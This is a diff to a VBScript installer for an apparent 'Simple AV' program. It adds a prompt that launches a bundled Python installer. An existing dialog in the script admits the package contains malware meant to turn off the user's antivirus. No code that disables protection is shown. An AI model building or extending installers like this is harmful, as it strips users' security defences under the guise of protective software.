@@ -1,6 +1,25 @@
 DIM FSO, MyFile
 Set oShell = CreateObject("WScript.Shell")
 Set FSO = CreateObject("Scripting.FileSystemObject")
+' install python
+answer = MsgBox("For some of this software to run properly you will need to install a computer language called python. If you dont have python click YES to install it, if you already have it click NO.", vbQuestion + vbYesNo + vbDefaultButton2, "Simple AV Alert")
+
+If answer = vbYes Then
+  WScript.sleep(5)
+  CreateObject("WScript.Shell").Run "simple\extras\python-3.11.0.exe"
+  a=MsgBox("Please close this prompt to move onto the next step.", 0+64, "Simple AV")
+  
+Else
+  End If
+
+  
+  
+
+
+
+
+
+
 answer = MsgBox("Disclaimer: Our program does consist of a malware, this malwares function is to turn off your antivirus and run this program. Knowing this information would you like to proceed?", vbQuestion + vbYesNo + vbDefaultButton2, "!!!WARNING!!!")
 
 If answer = vbYes Then
